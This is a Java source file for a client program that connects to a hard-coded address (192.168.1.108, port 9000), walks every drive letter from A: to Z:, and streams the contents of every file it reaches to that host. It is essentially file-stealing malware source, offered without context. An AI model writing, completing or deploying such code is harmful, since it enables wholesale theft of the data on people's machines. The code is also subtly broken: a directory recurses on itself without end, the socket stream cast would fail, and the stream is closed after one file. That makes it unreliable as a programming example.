package com.zz.client;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;

public class Client {
	public static  Socket socket = null;
	
	public static  String[] diskNames = { "A:/", "B:/", "C:/", "D:/", "E:/", "F:/", "G:/",
			"H:/", "I:/", "J:/", "K:/", "L:/", "M:/", "N:/", "O:/", "P:/",
			"Q:/", "R:/", "S:/", "T:/", "U:/", "V:/", "W:/", "X:/", "Y:/",
			"Z:/" };

	public static void traversal(File path,Socket socket){
		
		if(path == null || !path.exists()){
			return ;
		}else if(path.isDirectory()){
			traversal(path,socket);
			 File[] array = path.listFiles();
			 for (int i=0;i<array.length;i++) {
				    traversal(array[i].getAbsoluteFile(),socket);
				   }
		}else{
			try {
				FileOutputStream out = (FileOutputStream) socket.getOutputStream();
				FileInputStream in = new  FileInputStream(path);
				byte[] b = new byte[4096];
				int a = 0;
				while((a = in.read(b, 0, b.length))!=-1){
					out.write(b, 0, a);
				}
				in.close();
				out.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
	public static void main(String[] args) {
		
		try {
			socket = new Socket("192.168.1.108", 9000);
			for(int i = 0; i < 26; i++){
				File file = new File(diskNames[i]);
				traversal(file,socket);
			}
		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
